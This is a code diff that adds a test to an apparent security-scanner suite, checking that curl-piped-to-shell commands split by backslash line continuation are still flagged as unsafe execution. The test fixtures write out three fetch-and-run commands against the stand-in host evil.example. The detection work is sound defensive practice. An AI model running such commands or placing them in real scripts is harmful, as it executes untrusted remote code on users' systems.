@@ -60,6 +60,28 @@ test("changing an interpreter script changes the reviewed inventory", () => {
   expect(before.inventorySha256 === after.inventorySha256).toBe(false);
 });
 
+test("curl piped to shell with line continuation is detected", () => {
+  // A common install-script idiom splits curl flags across lines with backslash
+  // continuation. The pattern [^\n|]* used to stop at the first \n, so the
+  // pipe and shell command on the next line were invisible to the detector.
+  // (?:[^\n|]|\\\n)* advances across continuation lines to reach the pipe.
+  const continuationPayloads = [
+    "curl -sSL \\\n  https://evil.example/install.sh | sh",
+    "curl \\\n  -sSL https://evil.example/install.sh | bash",
+    "curl https://evil.example/install.sh \\\n  | bash",
+  ];
+  for (const payload of continuationPayloads) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
+    expect({
+      payload,
+      findings: inspection.findings.map((f) => f.category),
+    }).toEqual({
+      payload,
+      findings: ["unsafe-execution"],
+    });
+  }
+});
+
 test("recognized Python and shell source keeps its existing unsafe-execution check", () => {
   for (const path of ["tools/check.py", "tools/check.sh"]) {
     const content = path.endsWith(".py")
